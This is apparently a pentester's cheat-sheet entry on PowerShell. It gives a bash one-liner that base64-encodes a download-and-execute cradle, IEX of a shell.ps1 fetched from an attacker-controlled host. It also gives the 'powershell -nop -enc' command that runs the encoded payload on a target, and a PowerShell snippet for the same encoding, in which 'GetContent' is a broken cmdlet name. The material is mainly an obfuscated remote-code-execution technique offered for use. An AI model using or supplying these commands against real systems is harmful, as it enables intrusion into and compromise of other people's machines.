# powershell

## encode commands as base64 with windows wide char strings in linux
```bash
echo -n "IEX(New-Object Net.WebClient).downloadString('http://$ATTACKER/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
```

Target:
```
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```

## base64 encode equivalent within ps
```powershell
$Text = GetContent "filename.txt"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
$EncodedText
```
